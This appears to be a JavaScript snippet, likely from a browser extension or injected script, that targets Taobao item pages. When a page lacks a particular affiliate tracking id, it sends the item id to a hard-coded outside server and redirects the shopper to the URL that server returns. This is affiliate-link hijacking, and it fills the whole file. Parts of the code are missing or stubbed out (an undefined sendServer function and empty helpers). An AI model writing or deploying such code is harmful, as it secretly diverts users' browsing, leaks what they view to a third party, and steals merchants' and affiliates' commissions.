(function () {

    var serverUrl = "http://161sa70148.51mypc.cn/qifanli/test.php";
	var userid = "mm_32249710";

    function getQueryString(name) {
        var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
        var r = window.location.search.substr(1).match(reg);
        if (r != null)
            return unescape(r[2]);
        return null;
    }

    if (window.location.search.indexOf("ali_trackid=2:"+userid) == -1 && window.location.hostname != "s.click.taobao.com") {

        var itemId = getQueryString("id");

        if (null != itemId && itemId != "") {


            sendServer(function (content, x) {

                if (content != "" && content != "undefined") {

                    location.href = content;

                }
            }, serverUrl + "?itemid=" + itemId + "&uuid=" + getUUID(serverUrl), "getTransUrl");


        }


    }

    function bin2hex(s) {
      
    }

    function getUUID(domain) {
      return "0";
    }

    // console.log();

})();
